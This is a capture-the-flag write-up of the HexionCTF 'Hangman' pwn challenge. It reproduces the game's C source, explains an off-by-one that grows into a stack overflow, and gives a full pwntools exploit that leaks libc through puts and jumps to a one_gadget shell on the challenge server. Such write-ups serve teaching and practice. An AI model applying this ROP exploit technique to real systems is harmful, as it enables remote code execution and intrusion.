
# Hangman
Binary Explotation, 988 points

## Description
> nc challenges1.hexionteam.com 3000
> Note: flag is in ./flag
> [hangman.zip](https://ctf.hexionteam.com/files/aaafbc08b41ebf1cbd59520da3a35397/hangman.zip?token=eyJ0ZWFtX2lkIjoxNDMsInVzZXJfaWQiOjE5MSwiZmlsZV9pZCI6MTF9.XpQXcg.P4fLkl1SBMQn72leiqqkt2np5Y8)

First, I like to check the program protections
```console
yuvaly0@yuvalyo-blup:~/Desktop/ctf_not_git/2020_hexion/Hangman_DONE$ checksec hangman
[*] '/home/yuvaly0/Desktop/ctf_not_git/2020_hexion/Hangman_DONE/hangman'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Lets run the program

```console
yuvaly0@yuvalyo-blup:~/Desktop/ctf_not_git/2020_hexion/Hangman_DONE$ ./hangman
Welcome to the Hangman game!!!
In this game, you have to guess the word
Else... YOU WILL BE HANGED!!!
Good Luck! UwU

 ___________.._______
| .__________))______|
| | / /      ||
| |/ /       ||
| | /        ||.-''.
| |/         |/  _  \
| |          ||  `/,|
| |          (\\`_.'
| |         .-`--'.
| |        /Y . . Y\
| |       // |   | \\
| |      //  | . |  \\
| |     ')   |   |   (`
| |          ||'||
| |          || ||
| |          || ||
| |          || ||
| |         / | | \
""""""""""|_`-' `-' |"""|
|"|"""""""\ \       '"|"|
| |        \ \        | |
: :         \ \       : :
. .          `'       . .

Lives: 5
_____

1 - Guess letter
2 - Guess word
3 - Give up
Enter choice: 
```

Looks like Its a `hangman` game, luckily we got source code :)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h> 
#include <unistd.h> 

#define WORD_MAX_LEN 32
#define MAX_HP 5
#define MAX_NUM_OF_WORDS 16
#define TRUE 1
#define FALSE 0

struct hangmanGame
{
    char word[WORD_MAX_LEN];
    char *realWord;
    char buffer[WORD_MAX_LEN];
    int wordLen;
    int hp;
};


unsigned int countLinesNum(char *filename)
{
    FILE *file = NULL;
    unsigned int count = 0;
    char c;

    file = fopen(filename, "r");

    if (!file)
    {
        puts("Failed to load list of words...");
        exit(1);
    }

    for (c = getc(file); c != EOF; c = getc(file))
    {
        if (c == '\n')
        {
            count++;
        }
    }

    fclose(file);

    return count;
}
       

char* getWord(char *filename, unsigned int wordMaxLen)
{
    unsigned int i = 0;
    unsigned int numOfWords = countLinesNum(filename);
    unsigned int wordNum = rand() % numOfWords + 1;
    unsigned int wordLen = 0;
    FILE* file = NULL;
    char *word = malloc(wordMaxLen);

    file = fopen(filename, "r");
    if (!file)
    {
        puts("Failed to load list of words...");
        exit(1);
    }

    for (i = 0; i < wordNum && fgets(word, wordMaxLen, file); i++);
    
    wordLen = strlen(word);
    for (i = 0; i < wordLen; i++)
    {
        if (word[i] == '\n')
        {
            word[i] = '\0';
        }
    }

    fclose(file);

    return word;
}
    

void initHangmanGame(struct hangmanGame *game)
{
    int i = 0;
    int len = 0;
    char* filename = "words.list";

    game->hp = MAX_HP;
    game->wordLen = WORD_MAX_LEN;
    
    game->realWord = getWord(filename, WORD_MAX_LEN);

    len = strlen(game->realWord);

    for (i = 0; i < len; i++)
    {
        game->word[i] = '_';
    }
    game->word[i] = 0;
}


void delHangmanGame(struct hangmanGame *game)
{
    free(game->realWord);
}


int guessLetter(struct hangmanGame *game)
{
    int len = strlen(game->realWord);
    int i = 0;
    int correct = FALSE;
    char letter = 0;

    letter = (char)getchar();
    getchar();

    for (i = 0; i < len; i++)
    {
        if (letter == game->realWord[i])
        {
            correct = TRUE;
            game->word[i] = letter;
        }
    }
    if (!correct)
    {
        game->hp--;
    }
    return correct;
}


int guessWord(struct hangmanGame *game)
{
    int i = 0;
    int len = game->wordLen;

    for (i = 0; i <= len; i++)
    {
        game->buffer[i] = (char)getchar();
        if (game->buffer[i] == '\n')
        {
            break;
        }
    }
    game->buffer[i] = 0;
    fflush(stdin);

    if (!strcmp(game->buffer, game->realWord))
    {
        strcpy(game->word, game->buffer);
        return TRUE;
    }
    game->hp--;

    return FALSE;
}


int isWordCompleted(struct hangmanGame *game)
{
    int i = 0;
    int len = strlen(game->word);

    for (i = 0; i < len; i++)
    {
        if (!islower(game->word[i]))
        {
            return FALSE;
        }
    }

    return TRUE;
}


int isDead(struct hangmanGame *game)
{
    return game->hp < 0;
}


void printHangman()
{
    puts(" ___________.._______\n"
         "| .__________))______|\n"
         "| | / /      ||\n"
         "| |/ /       ||\n"
         "| | /        ||.-''.\n"
         "| |/         |/  _  \\\n"
         "| |          ||  `/,|\n"
         "| |          (\\\\`_.'\n"
         "| |         .-`--'.\n"
         "| |        /Y . . Y\\\n"
         "| |       // |   | \\\\\n"
         "| |      //  | . |  \\\\\n"
         "| |     ')   |   |   (`\n"
         "| |          ||'||\n"
         "| |          || ||\n"
         "| |          || ||\n"
         "| |          || ||\n"
         "| |         / | | \\\n"
         "\"\"\"\"\"\"\"\"\"\"|_`-' `-' |\"\"\"|\n"
         "|\"|\"\"\"\"\"\"\"\\ \\       '\"|\"|\n"
         "| |        \\ \\        | |\n"
         ": :         \\ \\       : :\n"
         ". .          `'       . .\n");
}


void gameLoop()
{
    struct hangmanGame game;
    char choice = 0;
    int exit = FALSE;

    initHangmanGame(&game);
    
    do
    {
        printHangman();
        printf("Lives: %d\n", game.hp);
        printf("%s\n", game.word);
        printf("\n1 - Guess letter\n2 - Guess word\n3 - Give up\n");
        printf("Enter choice: ");

        choice = (char)getchar();
        getchar();

        switch (choice)
        {
        case '1':
            printf("Enter letter: ");
            if (guessLetter(&game))
            {
                puts("Correct!");
            }
            else
            {
                puts("Wrong...");
            }            
            break;
        
        case '2':
            printf("Enter word: ");
            if (guessWord(&game))
            {
                puts("Correct!");
            }
            else
            {
                puts("Wrong...");
            }
            break;

        case '3':
            puts("Good bye! :)");
            exit = TRUE;
            break;

        default:
            puts("Invalid choice...");
            break;
        }
    } while (!exit && !isWordCompleted(&game) && !isDead(&game));
   
    if (isWordCompleted(&game))
    {
        puts("Congratulations!!!");
        printf("You've guessed the word \"%s\"!!!\n", game.realWord);
        puts("But it is still not enough to get a flag");
        puts("Have a nice day!");
    }
    if (isDead(&game))
    {
        puts("You've been hanged!!! :/");
        printf("The word you were looking for is %s\n", game.realWord);
    }

    delHangmanGame(&game);
}


int main(int argc, char const *argv[])
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL));

    puts("Welcome to the Hangman game!!!");
    puts("In this game, you have to guess the word");
    puts("Else... YOU WILL BE HANGED!!!");
    puts("Good Luck! UwU\n");

    gameLoop();

    return 0;
}


```

## Vulnerability

The vulnerabilities I found while examining the program are:

1. week seed for `rand` function

```c
srand(time(NULL));
```

2. Stack Off By One

```c
struct hangmanGame
{
    char word[WORD_MAX_LEN];
    char *realWord;
    char buffer[WORD_MAX_LEN];
    int wordLen;
    int hp;
};
...
int len = game->wordLen;

for (i = 0; i <= len; i++)
{
    game->buffer[i] = (char)getchar();
    if (game->buffer[i] == '\n')
    {
        break;
    }
}
```

## Solution

After reviewing the vulnerabilities I've decided not to use the weak seed because I wont gain anything.

Because in the loop we read until `i <= len` instead of `i < len` we have an _off by one_, if we'll look whats after the buffer in the struct we'll see that well be overwriting the `wordLen` variable, but what good will that do?

If we search all the times that `game->wordLen` is used in the program we can see that he is used in two places:

1. inside `InitHangmanGame`
```c
game->wordLen = WORD_MAX_LEN;
```

2. inside `guessWord`
```c
int len = game->wordLen;
```

The first time its called during initialization so we dont care, but the second time :)

The program reads `len` charectars from the user into `game->buffer`, so we got `buffer overflow`.

But with what value? It doesnt really matter as long it will be in the size of our payload

```python
buffer_length = 32
payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)
```

The clean buffer option is to clean the buffer, any two digit number will be good, try to see what happens if you wont do it

I took 'z' because Its the charecter with the greatest ascii value

Now that we control over rip where should we jump? i couldnt see any `print_flag` functions

This is where i got a bit off from the intended solution from the author of the challenge

Becuase there isnt `Canary` to the program we can overwrite the buffer as we want without fear of crashing

I thought to leak a libc address using [ret2puts](http://court-of-testing-analysing.blogspot.com/2019/12/writeup-pwn-tarzan-rop-unictf-day-71.html) technique and then jumping to one gadget.
I figured out the remote libc version using [libc database search](https://libc.blukat.me/)

So we want to jump to `puts@plt` with `puts@got` as the first argument, hence the program is 64 bits we need a `pop rdi; ret` gadget, well use `ROPgadget` for this:

```console
yuvaly0@yuvalyo-blup:~/Desktop/ctf_not_git/2020_hexion/Hangman_DONE$ ROPgadget --binary hangman | grep 'pop rdi'
0x00000000004019a3 : pop rdi ; ret
```

lets write the second payload:
```python
overflow_offset = 64
pop_rdi_ret = 0x4019a3
puts_got = e.got['puts']
puts_plt = e.sym['puts']
game_loop = e.sym['gameLoop']
payload = 'A' * overflow_offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +  p64(game_loop)
guess_word(payload)
```

But wait, where should we return after the leak? I decided to return to `gameLoop` function, yes it means we will have to trigger the off by one again, but its only a couple of rows :)

Lets collect our precious leak, calculate libc base and trigger the off by one again:
```python
sh.recvuntil('Wrong...\n')
leak = u64(sh.recvline(keepends=False).ljust(8, '\x00'))
libc.address = leak - libc.sym['_IO_puts']
log.info('libc base: {}'.format(hex(libc.address)))


payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)
```

finally we can check the offset for a `one gadget` using the `onegadget` tool:
```console
yuvaly0@yuvalyo-blup:~/Desktop/ctf_not_git/2020_hexion/Hangman_DONE$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

To find out which will be good for us we can put a breakpoint right before the exit of `gameLoop` becuase thats the function rip's we will overwrite and check the constraints

Now we can overflow and jump to one gadget :)
```python
one_gadget_offset = 0x10a38c
payload = 'A' * overflow_offset + p64(libc.address + one_gadget_offset)
guess_word(payload)

sh.interactive()
```
Thats the final exploit: 
```python
from pwn import *
import sys

context.clear(os='linux', arch='amd64')
# context.log_level='debug'

__author__ = 'yuvaly0'

argv = sys.argv
binary_path = './hangman'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('challenges1.hexionteam.com', 3000)
else:
	sh = process([binary_path])

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')


if DEBUG:
	gdb.attach(sh, '''
		b* gameLoop+494
		c
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overflow and leak puts got address
# jump to one gadget

def guess_word(word, clean_buffer=False):
	sh.sendlineafter('Enter choice: ', '2')
	sh.sendlineafter('Enter word: ', word)
	if clean_buffer:
		sh.sendlineafter('Enter choice: ', '10') # clean buffer


buffer_length = 32
payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)

overflow_offset = 64
pop_rdi_ret = 0x4019a3
puts_got = e.got['puts']
puts_plt = e.sym['puts']
game_loop = e.sym['gameLoop']
payload = 'A' * overflow_offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +  p64(game_loop)
guess_word(payload)


sh.recvuntil('Wrong...\n')
leak = u64(sh.recvline(keepends=False).ljust(8, '\x00'))
libc.address = leak - libc.sym['_IO_puts']
log.info('libc base: {}'.format(hex(libc.address)))


payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)

one_gadget_offset = 0x10a38c
payload = 'A' * overflow_offset + p64(libc.address + one_gadget_offset)
guess_word(payload)

sh.interactive()
```



We'll run with the remote option:

```console
yuvaly0@yuvalyo-blup:~/Desktop/ctf_not_git/2020_hexion/Hangman_DONE$ python exploit.py remote
[+] Opening connection to challenges1.hexionteam.com on port 3000: Done
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/yuvaly0/Desktop/ctf_not_git/2020_hexion/Hangman_DONE/hangman'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] libc base: 0x7fc00ff72000
[*] Switching to interactive mode
Wrong...
$ ls
flag
hangman
hangman.c
words.list
ynetd
$ cat flag
hexCTF{e1th3r_y0u_gu3ss_0r_y0u_h4ng}
```

Flag:
> hexCTF{e1th3r_y0u_gu3ss_0r_y0u_h4ng}
